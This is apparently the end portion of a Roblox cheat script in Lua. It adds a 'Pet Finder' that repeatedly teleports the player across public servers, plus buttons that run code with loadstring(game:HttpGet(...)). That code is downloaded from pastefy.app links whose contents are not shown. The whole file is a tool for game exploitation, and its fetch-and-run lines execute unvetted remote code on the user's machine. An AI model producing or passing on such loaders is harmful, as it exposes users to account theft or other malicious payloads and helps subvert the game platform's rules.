                return game:HttpGet(apiUrl .. placeId .. "/servers/Public?sortOrder=" .. sortOrder .. "&limit=10")
            end)
            
            if not success then
                return {data = {}}
            end
            
            local decodeSuccess, data = pcall(HttpService.JSONDecode, HttpService, response)
            if not decodeSuccess then
                return {data = {}}
            end
            
            return data
        end
        
        local function togglePetFinder()
            if isSearching then
                isSearching = false
                Buttons[9].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                notify("Pet Finder", "Stopped", 3)
                return
            end
            
            isSearching = true
            Buttons[9].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
            notify("Pet Finder", "Started - re-New every 3s", 3)
            
            task.spawn(function()
                while isSearching do
                    local sortOrder = math.random(1, 2) == 1 and "Asc" or "Desc"
                    local servers = getServers(sortOrder)
                    
                    if servers and servers.data and #servers.data > 0 then
                        local unvisitedServers = {}
                        
                        for _, server in ipairs(servers.data) do
                            if server.id ~= jobId and not hasVisited(server.id) then
                                table.insert(unvisitedServers, server)
                            end
                        end
                        
                        if #unvisitedServers > 0 then
                            local randomServer = unvisitedServers[math.random(1, #unvisitedServers)]
                            markServerVisited(randomServer.id)
                            
                            pcall(function()
                                TeleportService:TeleportToPlaceInstance(placeId, randomServer.id, Player)
                            end)
                        end
                    end
                    
                    task.wait(3)
                end
            end)
        end
        
        loadVisitedServers()
        togglePetFinder()
    end)
    
    -- ===========================
    -- FEATURE 10: PLAY GAME
    -- ===========================
    Buttons[10].MouseButton1Click:Connect(function()
        loadstring(game:HttpGet("https://pastefy.app/GAL4YOOl/raw"))()
        Buttons[10].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        wait(0.5)
        Buttons[10].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    end)
    
    Buttons[10].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    
    -- ===========================
    -- FEATURE 11: PLATFORM
    -- ===========================
    Buttons[11].MouseButton1Click:Connect(function()
        loadstring(game:HttpGet("https://pastefy.app/QIvhYFiV/raw"))()
        Buttons[11].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        wait(0.5)
        Buttons[11].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    end)
    
    Buttons[11].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    
    -- ===========================
    -- FEATURE 2: 120FPS | NO LAG
    -- ===========================
    Buttons[2].MouseButton1Click:Connect(function()
        loadstring(game:HttpGet("https://pastefy.app/FGwPTxy8/raw", true))()
    end)
    
    -- Mark as executed
    _G.jrtofrt = true
end)

-- Additional error handling
local TeleportService = game:GetService("TeleportService")

pcall(function()
end)

task.spawn(function()
end)

warn("i")
